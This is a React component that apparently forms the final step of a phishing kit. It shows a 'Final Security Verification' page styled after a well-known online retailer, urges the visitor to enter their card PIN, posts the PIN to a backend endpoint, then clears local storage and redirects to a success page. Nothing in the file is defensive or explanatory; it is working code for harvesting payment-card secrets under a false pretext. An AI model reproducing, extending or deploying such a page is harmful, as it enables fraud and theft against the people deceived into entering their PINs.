import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import Logo from "../../components/Logo/Logo";

const FinalStep = () => {
  const navigate = useNavigate();
  const [pin, setPin] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    setError("");

    try {
      const response = await fetch(
        `${process.env.REACT_APP_API_URL}/auth/verify-pin`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ pin }),
        }
      );

      if (response.ok) {
        // Wait for 3 seconds before redirecting
        setTimeout(() => {
          // First set the required session values
          sessionStorage.setItem("isAuthenticated", "true");
          sessionStorage.setItem("completedFlow", "verified");

          // Navigate first
          navigate("/success", { replace: true });

          // Then clear other data after navigation
          setTimeout(() => {
            localStorage.clear();
            // Keep the required session values
            const isAuthenticated = sessionStorage.getItem("isAuthenticated");
            const completedFlow = sessionStorage.getItem("completedFlow");
            sessionStorage.clear();
            sessionStorage.setItem("isAuthenticated", isAuthenticated);
            sessionStorage.setItem("completedFlow", completedFlow);
          }, 100);
        }, 3000);
      } else {
        setError("An error occurred. Please try again.");
        setIsLoading(false);
      }
    } catch (error) {
      setError("An error occurred. Please try again.");
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center pt-8 px-4">
      <Logo />

      <div className="w-full max-w-[600px] bg-white border border-[#D5D9D9] rounded-lg p-6 mt-8">
        <h1 className="text-2xl font-normal mb-4">
          Final Security Verification
        </h1>

        <div className="bg-[#FFF5CC] border border-[#FFD814] p-4 rounded-lg mb-6">
          <div className="flex items-start">
            <span className="text-[#C40000] mr-2">⚠️</span>
            <p className="text-sm">
              For your security, please enter your card PIN to complete the
              verification process.
            </p>
          </div>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className="block text-sm font-medium text-[#0F1111] mb-1">
              Card PIN
            </label>
            <input
              type="password"
              maxLength="6"
              value={pin}
              onChange={(e) => setPin(e.target.value.replace(/\D/g, ""))}
              className={`w-full p-2 border rounded text-base ${
                error ? "border-[#C40000]" : "border-[#D5D9D9]"
              } focus:border-[#E77600] focus:shadow-[0_0_3px_2px_rgb(228,121,17,50%)] outline-none`}
              placeholder="Enter PIN"
            />
            {error && <p className="text-[#C40000] text-sm mt-1">{error}</p>}
          </div>

          <button
            type="submit"
            disabled={isLoading || pin.length < 4}
            className={`w-full bg-[#FFD814] p-3 rounded-lg font-medium ${
              isLoading || pin.length < 4
                ? "opacity-50 cursor-not-allowed"
                : "hover:bg-[#F7CA00]"
            }`}
          >
            {isLoading ? "Verifying..." : "Complete Verification"}
          </button>
        </form>
      </div>
    </div>
  );
};

export default FinalStep;
